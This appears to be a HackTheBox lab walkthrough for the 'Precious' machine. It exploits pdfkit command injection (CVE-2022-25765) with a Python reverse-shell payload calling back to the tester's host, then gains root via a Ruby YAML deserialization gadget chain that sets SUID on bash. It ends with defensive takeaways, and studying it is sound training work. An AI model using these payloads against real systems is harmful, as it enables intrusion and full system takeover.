@@ -1,0 +1,161 @@
+---
+title: "Precious - HTB Walkthrough"
+description: "Command injection via a vulnerable pdfkit build for a foothold, then root through Ruby YAML deserialization."
+date: 2026-01-12
+tags: ["web", "command-injection", "privesc", "ruby", "htb"]
+platform: "HackTheBox"
+type: "Machine"
+difficulty: "Easy"
+os: "Linux"
+ip: "10.10.11.189"
+url: "https://app.hackthebox.com/machines/Precious"
+knowledge: []
+icon: ./images/precious.png
+draft: false
+---
+
+import Callout from '../../components/Callout.astro';
+import Spoiler from '../../components/Spoiler.astro';
+
+
+## Overview
+
+A web service converts a supplied URL into a PDF and is vulnerable to command injection through an outdated `pdfkit` version. That gives a foothold; recovered credentials get us to a user; and a `sudo`-runnable Ruby script that parses YAML with `YAML.load` gives us root via a deserialization gadget chain.
+
+## Reconnaissance
+
+Add the host to `/etc/hosts` as `precious.htb`, then scan:
+
+```bash
+nmap -sC -sV -oA precious precious.htb
+```
+
+Ports 22 (SSH) and 80 (nginx) are open. The site is a "Convert Web Page to PDF" tool. Remote URLs error out, so we point it at our own server:
+
+```bash
+python3 -m http.server 8000
+```
+
+Feeding it `http://LOCALIP:8000/` returns a PDF.
+
+## Inspecting the PDF
+
+```bash
+pdfinfo <generated>.pdf
+```
+
+The metadata reveals the generator: `pdfkit v0.8.6`.
+
+<Callout type="tip">
+Always check document metadata (`pdfinfo`, `exiftool`). The generating library and its version are frequently the fastest route to a known CVE.
+</Callout>
+
+`pdfkit` 0.0.0–0.8.6 is vulnerable to command injection (CVE-2022-25765) when rendering a URL that contains unsanitized query-string input.
+
+## Foothold - Command Injection
+
+Test injection with backticks around a command:
+
+```url
+http://LOCALIP:8000/?name=%20`id`
+```
+
+The output of `id` appears in the generated PDF - confirmed. Now swap in a reverse shell. Start a listener:
+
+```bash
+nc -lnvp 4444
+```
+
+Then the payload:
+
+```url
+http://LOCALIP:8000/?name=%20`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LOCALIP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'`
+```
+
+We land a shell as `ruby`.
+
+## Gaining User Access
+
+Enumerating `ruby`'s home turns up a bundler config with credentials:
+
+```bash
+cat ~/.bundle/config
+```
+
+```
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:PASSWORD_REDACTED"
+```
+
+SSH in as `henry` with those credentials and grab `user.txt`.
+
+<Spoiler summary="Reveal user flag">
+`user:<redacted>`
+</Spoiler>
+
+## Privilege Escalation
+
+Check `henry`'s sudo rights:
+
+```bash
+sudo -l
+```
+
+```
+(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+The script reads a local `dependencies.yml` with `YAML.load`:
+
+```ruby
+def list_from_file
+  YAML.load(File.read("dependencies.yml"))
+end
+```
+
+<Callout type="warning">
+`YAML.load` in older Ruby deserializes arbitrary objects, not just data. Untrusted input passed to it is a remote/local code-execution primitive. The safe API is `YAML.safe_load`.
+</Callout>
+
+## Root
+
+In a writable directory, create a malicious `dependencies.yml` using a known Ruby deserialization gadget chain that reaches `Kernel#system`, setting the SUID bit on bash:
+
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "chmod +s /bin/bash"
+         method_id: :resolve
+```
+
+Run the sudo-allowed script so the payload executes as root, then drop into a privileged shell:
+
+```bash
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+/bin/bash -p
+cat /root/root.txt
+```
+
+<Spoiler summary="Reveal root flag">
+`root:<redacted>`
+</Spoiler>
+
+## Key Takeaways
+
+- Outdated dependencies are a direct liability - `pdfkit` 0.8.6 shipped a known RCE. Pinning and patching dependency versions is a real control, not busywork.
+- `YAML.load` (Ruby) and `pickle` (Python) and similar "load arbitrary object" deserializers should never touch untrusted input. Prefer the safe variants.
+- SUID-on-bash (`chmod +s /bin/bash` → `bash -p`) is a classic escalation payload; monitoring for unexpected SUID changes catches it.
